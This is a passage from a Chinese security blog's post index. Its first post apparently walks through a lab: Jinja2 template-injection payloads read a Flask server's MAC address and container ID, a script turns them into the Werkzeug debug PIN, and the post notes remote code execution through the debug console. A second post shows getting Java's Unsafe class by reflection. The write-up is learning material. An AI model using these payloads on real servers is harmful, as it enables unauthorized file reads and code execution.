+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316154906263.png" class>
+
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">7</span><span class="regexp">/site-packages/</span>flask/app.py</span><br></pre></td></tr></table></figure>
+
+<h5 id="获取MAC地址的10进制数"><a href="#获取MAC地址的10进制数" class="headerlink" title="获取MAC地址的10进制数"></a><strong>获取MAC地址的10进制数</strong></h5><p> <code>**/sys/class/net/eth0/address**</code></p>
+<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> <span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316155247697.png" class>
+
+<p> <code>72fe70bd0459</code></p>
+<p>将:去除转化为10进制</p>
+<p><code>126437138695257</code></p>
+<h5 id="获取docker机器的id"><a href="#获取docker机器的id" class="headerlink" title="获取docker机器的id"></a><strong>获取docker机器的id</strong></h5><p>这个环境式docker启动的，所以机器的id就式docekr容器的id值</p>
+<p>对于机器id的解释，引用一下师傅的言论</p>
+<p>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在**&#x2F;etc&#x2F;machine-id<strong>或</strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i<strong>，有的系统没有这两个文件。对于docker机则读取</strong>&#x2F;proc&#x2F;self&#x2F;cgroup**，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id</p>
+<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> <span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>bb89acbd6e0417d61a68ffd090617baed746e020991af325389751b3cb57338b</code></p>
+<p>利用师傅的脚本生成PIN码:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;`126437138695257`&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;`bb89acbd6e0417d61a68ffd090617baed746e020991af325389751b3cb57338b`&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
+
+<p>这里存在一个问题，生成的PIN码显示不正确，在我尝试后将dockerid的值改为了machineid的值</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到PIN值后成功进入python的交互式shell</p>
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316162054451.png" class>
+
+<p>这里输出零，可能设置了python沙盒禁用了某些函数</p>
+<p>使用os.popen后成功RCE</p>
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316162334799.png" class>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于每一台机器由不同的PIN码，但是对于同一台机器多次启动Flask服务的PIN码相同</p>
+<p>对于PIN码的获得并不容易，上面最终还是通过模板注入才获取到三个敏感信息的内容</p>
+<h3 id="rerference"><a href="#rerference" class="headerlink" title="rerference"></a>rerference</h3><p><a href="https://zhuanlan.zhihu.com/p/32138231">https://zhuanlan.zhihu.com/p/32138231</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/32336971">https://zhuanlan.zhihu.com/p/32336971</a></p>
+<p><a href="https://blog.csdn.net/RABCDXB/article/details/117773638">https://blog.csdn.net/RABCDXB/article/details/117773638</a></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>通过反射获取Unsafe实例</title>
+    <url>/2022/03/09/%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96Unsafe%E5%AE%9E%E4%BE%8B/</url>
+    <content><![CDATA[<h2 id="sun-misc-Unsafe"><a href="#sun-misc-Unsafe" class="headerlink" title="sun.misc.Unsafe"></a>sun.misc.Unsafe</h2><p><code>sun.misc.Unsafe</code>是Java底层API(<code>仅限Java内部使用,反射可调用</code>)提供的一个神奇的Java类，<code>Unsafe</code>提供了非常底层的<code>内存、CAS、线程调度、类、对象</code>等操作,sun.misc.Unsafe提供了可以随意查看及修改JVM中运行时的数据结构,<code>Unsafe</code>正如它的名字一样它提供的几乎所有的方法都是不安全的</p>
+<span id="more"></span>
+
+<h2 id="获取Unsafe实例"><a href="#获取Unsafe实例" class="headerlink" title="获取Unsafe实例"></a>获取Unsafe实例</h2><p>由于Unsafe是java内部定义的API，外部肯定是禁止调用的，直接调用编译器肯定会报错的</p>
+<p><code>sun.misc.Unsafe</code>的部分代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.reflect.CallerSensitive;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Unsafe</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Unsafe theUnsafe;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        theUnsafe = <span class="keyword">new</span> <span class="title class_">Unsafe</span>();</span><br><span class="line">        省去其他代码......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Unsafe</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var0</span> <span class="operator">=</span> Reflection.getCallerClass();<span class="comment">//得到调用者的类</span></span><br><span class="line">        <span class="keyword">if</span> (var0.getClassLoader() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Unsafe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> theUnsafe;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    省去其他代码......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出这个类不能部继承，并且通过new关键字不能创建Unsafe的实例，但定义了一个getUnsafe方法，可以返回一个theUnsafe实例</p>
+<p>但是通过这种方法定义要先检查类加载器默认只允许<code>Bootstrap Classloader</code>调用。（为什么只允许这个类加载器？)</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(ClassLoader.getSystemClassLoader());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/09/%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96Unsafe%E5%AE%9E%E4%BE%8B/image-20220309212007720.png" class>
+
+<p>系统的默认加载器为AppClassLoader</p>
+<p>所以无法直接通过Unsafe.getUnsafe()的方法调用，那么可以尝试使用反射的方法调用</p>
+<h3 id="反射代码"><a href="#反射代码" class="headerlink" title="反射代码"></a>反射代码</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射获取Unsafe的theUnsafe成员变量</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射设置theUnsafe访问权限</span></span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射获取theUnsafe成员变量值</span></span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也可以用反射创建<code>Unsafe</code>类实例的方式去获取<code>Unsafe</code>对象：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Unsafe无参构造方法</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Unsafe.class.getDeclaredConstructor();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改构造方法访问权限</span></span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射创建Unsafe类实例，等价于 Unsafe unsafe1 = new Unsafe();</span></span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe1</span> <span class="operator">=</span> (Unsafe) constructor.newInstance();</span><br></pre></td></tr></table></figure>
+
+<p>获取到Unsafe实例后就可以调用内部的方法了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">代填坑。。。。</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>javasec</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+</search>
